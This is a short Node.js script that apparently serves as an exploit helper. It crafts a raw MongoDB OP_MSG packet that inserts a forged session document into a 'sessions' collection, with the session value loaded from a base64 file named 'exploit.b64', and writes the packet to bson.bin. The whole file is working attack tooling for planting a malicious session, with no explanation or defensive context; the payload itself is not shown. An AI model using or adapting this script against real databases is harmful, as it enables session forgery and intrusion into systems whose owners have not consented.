const BSON = require('bson');
const fs = require('fs');

const doc = {
    insert: "sessions", $db: "admin", documents: [{
        "id": "session:e51fca6f-1148-450c-8961-b5d1aaaaaaac",
        "val": Buffer.from(fs.readFileSync("exploit.b64").toString(), "base64"),
        "expiration": new Date("2025-02-17")
    }]
};
const data = BSON.serialize(doc);

let beginning = Buffer.from("5D0000000000000000000000DD0700000000000000", "hex");
let full = Buffer.concat([beginning, data]);

full.writeUInt32LE(full.length, 0);
fs.writeFileSync("bson.bin", full);